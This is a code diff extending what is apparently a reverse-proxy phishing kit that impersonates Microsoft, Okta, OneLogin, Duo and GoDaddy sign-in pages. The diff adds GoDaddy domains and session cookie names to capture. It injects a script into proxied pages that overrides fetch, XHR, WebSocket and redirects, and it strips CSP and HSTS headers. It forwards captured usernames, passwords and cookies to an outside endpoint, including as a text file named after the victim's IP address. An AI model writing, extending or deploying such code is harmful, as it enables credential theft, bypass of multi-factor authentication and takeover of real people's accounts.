@@ -28,7 +28,10 @@ const IDENTITY_PROVIDERS = {
   'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
   'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
   'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
-  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' }
+  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' },
+  'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
+  'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
+  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' }
 };
 
 const CRITICAL_AUTH_COOKIES = {
@@ -36,8 +39,15 @@ const CRITICAL_AUTH_COOKIES = {
   okta: ['sid', 'authtoken'],
   onelogin: ['sub_session_onelogin'],
   duo: ['.*'],
-  godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token']
+  godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
 };
+
+// Additional domains that should be proxied if encountered
+const ADDITIONAL_DOMAINS = [
+  'secureserver.net',
+  'godaddy.com',
+  'godaddycdn.com'
+];
 // =======================================================================
 
 async function sendToVercel(type, data) {
@@ -119,14 +129,55 @@ function cleanQueryString(search) {
   return search;
 }
 
+function shouldProxyDomain(hostname) {
+  if (IDENTITY_PROVIDERS[hostname]) return true;
+  if (hostname.includes('microsoft') || hostname.includes('live.com') || 
+      hostname.includes('office.com') || hostname.includes('msauth.net')) return true;
+  if (hostname.includes('godaddy.com') || hostname.includes('secureserver.net')) return true;
+  if (hostname.includes('okta.com')) return true;
+  if (hostname.includes('onelogin.com')) return true;
+  if (hostname.includes('duosecurity.com')) return true;
+  return false;
+}
+
+function rewriteUrl(url) {
+  try {
+    // Handle absolute URLs
+    if (url.startsWith('http://') || url.startsWith('https://')) {
+      const urlObj = new URL(url);
+      if (shouldProxyDomain(urlObj.hostname)) {
+        return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${urlObj.hostname}${urlObj.pathname}${urlObj.search}`;
+      }
+      return url;
+    }
+    
+    // Handle protocol-relative URLs
+    if (url.startsWith('//')) {
+      const hostname = url.split('/')[2];
+      if (shouldProxyDomain(hostname)) {
+        return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${hostname}${url.substring(2 + hostname.length)}`;
+      }
+      return 'https:' + url;
+    }
+    
+    return url;
+  } catch (e) {
+    return url;
+  }
+}
+
 function rewriteUrls(text, upstreamDomain) {
   let result = text;
   
+  // Replace localhost references
   result = result.replace(/https?:\/\/localhost(:\d+)?/g, `https://${YOUR_DOMAIN}`);
   result = result.replace(/\/\/localhost(:\d+)?/g, `//${YOUR_DOMAIN}`);
   
+  // Replace all known identity provider domains
   Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
     const escaped = domain.replace(/\./g, '\\.');
+    
+    // Full URLs
     result = result.replace(
       new RegExp(`https://${escaped}(?!\\w)`, 'g'),
       `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
@@ -135,19 +186,20 @@ function rewriteUrls(text, upstreamDomain) {
       new RegExp(`http://${escaped}(?!\\w)`, 'g'),
       `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
     );
+    // Protocol-relative
     result = result.replace(
       new RegExp(`//${escaped}(?!\\w)`, 'g'),
       `//${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
     );
   });
   
-  // Fix relative paths
+  // Fix relative paths for current upstream
   result = result.replace(
-    /(["'])\/(common|ppsecure|auth|api|Me\.htm|Prefetch\.aspx|login|oauth2|GetCredentialType)/g,
+    /(["'])\/(common|ppsecure|auth|api|v1|v2|Me\.htm|Prefetch\.aspx|login|oauth2|GetCredentialType)/g,
     `$1https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$2`
   );
   
-  // Fix JS references
+  // Fix JS hostname/domain assignments
   result = result.replace(
     /window\.location\.hostname\s*=\s*["'][^"']+["']/g,
     `window.location.hostname = "${YOUR_DOMAIN}"`
@@ -156,6 +208,10 @@ function rewriteUrls(text, upstreamDomain) {
     /document\.domain\s*=\s*["'][^"']+["']/g,
     `document.domain = "${YOUR_DOMAIN}"`
   );
+  result = result.replace(
+    /window\.__DOMAIN__\s*=\s*["'][^"']+["']/g,
+    `window.__DOMAIN__ = "${YOUR_DOMAIN}"`
+  );
   
   return result;
 }
@@ -163,13 +219,7 @@ function rewriteUrls(text, upstreamDomain) {
 function rewriteLocation(location) {
   try {
     const url = new URL(location);
-    const shouldProxy = IDENTITY_PROVIDERS[url.hostname] || 
-                       url.hostname.includes('microsoft') || 
-                       url.hostname.includes('live.com') || 
-                       url.hostname.includes('office.com') ||
-                       url.hostname.includes('msauth.net');
-    
-    if (shouldProxy) {
+    if (shouldProxyDomain(url.hostname)) {
       return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${url.search}`;
     }
     return location;
@@ -219,6 +269,97 @@ function parseCredentials(bodyText) {
   return { user, pass };
 }
 
+// ==================== CLIENT-SIDE INTERCEPTOR SCRIPT ====================
+function generateInterceptorScript() {
+  return `
+<script>
+(function() {
+  'use strict';
+  
+  const PROXY_PREFIX = '${PROXY_PREFIX}';
+  const YOUR_DOMAIN = '${YOUR_DOMAIN}';
+  
+  function shouldProxyDomain(hostname) {
+    const domains = [
+      'microsoftonline.com', 'live.com', 'microsoft.com', 'msauth.net',
+      'office.com', 'godaddy.com', 'secureserver.net', 'okta.com',
+      'onelogin.com', 'duosecurity.com'
+    ];
+    return domains.some(d => hostname.includes(d));
+  }
+  
+  function rewriteUrl(url) {
+    if (!url) return url;
+    try {
+      if (url.startsWith('http')) {
+        const urlObj = new URL(url);
+        if (shouldProxyDomain(urlObj.hostname) && !urlObj.hostname.includes(YOUR_DOMAIN)) {
+          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + urlObj.hostname + urlObj.pathname + urlObj.search;
+        }
+      } else if (url.startsWith('//')) {
+        const hostname = url.split('/')[2];
+        if (shouldProxyDomain(hostname)) {
+          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + hostname + url.substring(2 + hostname.length);
+        }
+      }
+    } catch(e) {}
+    return url;
+  }
+  
+  // Override fetch
+  const originalFetch = window.fetch;
+  window.fetch = function(url, options) {
+    const newUrl = rewriteUrl(url);
+    if (newUrl !== url) {
+      console.log('[Proxy Interceptor] Fetch:', url, '->', newUrl);
+    }
+    return originalFetch.call(this, newUrl, options);
+  };
+  
+  // Override XMLHttpRequest
+  const originalOpen = XMLHttpRequest.prototype.open;
+  XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
+    const newUrl = rewriteUrl(url);
+    if (newUrl !== url) {
+      console.log('[Proxy Interceptor] XHR:', url, '->', newUrl);
+    }
+    return originalOpen.call(this, method, newUrl, async, user, password);
+  };
+  
+  // Override WebSocket
+  const originalWebSocket = window.WebSocket;
+  window.WebSocket = function(url, protocols) {
+    const newUrl = rewriteUrl(url);
+    if (newUrl !== url) {
+      console.log('[Proxy Interceptor] WebSocket:', url, '->', newUrl);
+    }
+    return new originalWebSocket(newUrl, protocols);
+  };
+  
+  // Override window.location redirects
+  const originalAssign = window.location.assign;
+  const originalReplace = window.location.replace;
+  
+  window.location.assign = function(url) {
+    return originalAssign.call(window.location, rewriteUrl(url));
+  };
+  window.location.replace = function(url) {
+    return originalReplace.call(window.location, rewriteUrl(url));
+  };
+  
+  // Intercept form submissions
+  document.addEventListener('submit', function(e) {
+    const form = e.target;
+    if (form.action && shouldProxyDomain(new URL(form.action).hostname)) {
+      form.action = rewriteUrl(form.action);
+    }
+  }, true);
+  
+  console.log('[Proxy Interceptor] Active - all requests routing through ${YOUR_DOMAIN}');
+})();
+</script>`;
+}
+
 export default async function handleRequest(request) {
   const url = new URL(request.url);
   const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
@@ -241,24 +382,34 @@ export default async function handleRequest(request) {
   headers.set('Host', upstreamDomain);
   headers.set('Referer', `https://${upstreamDomain}/`);
   headers.set('Origin', `https://${upstreamDomain}`);
+  
+  // Handle preflight requests explicitly
+  if (request.method === 'OPTIONS') {
+    return new Response(null, {
+      status: 200,
+      headers: {
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
+        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
+        'Access-Control-Allow-Credentials': 'true',
+        'Access-Control-Max-Age': '86400'
+      }
+    });
+  }
 
   // ==================== CREDENTIAL CAPTURE ====================
   if (request.method === 'POST') {
     try {
-      // Clone request and get body text
       const temp_req = await request.clone();
       const bodyText = await temp_req.text();
       
       console.log('[DEBUG] POST body:', bodyText.substring(0, 300));
       
-      // Use universal parsing logic
       const { user, pass } = parseCredentials(bodyText);
       
-      // If both present, send immediately
       if (user && pass) {
         console.log(`[CREDENTIALS CAPTURED] User: ${user.substring(0, 5)}... Pass: **** Platform: ${info.type}`);
         
-        // Send to API as JSON
         await sendToVercel('credentials', {
           type: "creds",
           ip: ip,
@@ -268,7 +419,6 @@ export default async function handleRequest(request) {
           url: displayUrl
         });
         
-        // Also send as file attachment
         const content = `IP: ${ip}\nPlatform: ${info.type}\nUser: ${user}\nPass: ${pass}\nURL: ${displayUrl}\n`;
         const formData = new FormData();
         formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-CREDENTIALS.txt`);
@@ -279,10 +429,7 @@ export default async function handleRequest(request) {
           method: "POST",
           body: formData,
         });
-      } else {
-        console.log('[DEBUG] No creds found - User:', user, 'Pass:', pass ? '****' : 'null');
       }
-      
     } catch (error) {
       console.error('Credential capture error:', error);
     }
@@ -320,10 +467,14 @@ export default async function handleRequest(request) {
     const newHeaders = new Headers(resp.headers);
     newHeaders.set('access-control-allow-origin', '*');
     newHeaders.set('access-control-allow-credentials', 'true');
+    newHeaders.set('access-control-allow-methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
+    newHeaders.set('access-control-allow-headers', 'Content-Type, Authorization, X-Requested-With');
     newHeaders.delete('content-security-policy');
     newHeaders.delete('content-security-policy-report-only');
     newHeaders.delete('clear-site-data');
+    newHeaders.delete('strict-transport-security');
     
+    // Handle cookies - remove Domain and Secure attributes, set SameSite=None
     const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
     let shouldCaptureCookies = false;
     let cookieStr = '';
@@ -335,7 +486,10 @@ export default async function handleRequest(request) {
       shouldCaptureCookies = isPost || hasAuth;
       
       cookies.forEach(c => {
-        const mod = c.replace(/Domain=[^;]+;?/gi, '');
+        let mod = c.replace(/Domain=[^;]+;?/gi, '');
+        mod = mod.replace(/Secure;?/gi, '');
+        mod = mod.replace(/SameSite=[^;]+;?/gi, '');
+        mod += '; SameSite=None';
         newHeaders.append('Set-Cookie', mod);
       });
     }
@@ -349,6 +503,20 @@ export default async function handleRequest(request) {
     if (/text\/html|application\/javascript|application\/json|text\/javascript/.test(ct)) {
       let text = await resp.text();
       text = rewriteUrls(text, upstreamDomain);
+      
+      // Inject interceptor script into HTML
+      if (ct.includes('text/html')) {
+        const interceptor = generateInterceptorScript();
+        // Insert after <head> or at the beginning
+        if (text.includes('<head>')) {
+          text = text.replace('<head>', '<head>' + interceptor);
+        } else if (text.includes('<html>')) {
+          text = text.replace('<html>', '<html>' + interceptor);
+        } else {
+          text = interceptor + text;
+        }
+      }
+      
       return new Response(text, { status: resp.status, headers: newHeaders });
     }
     
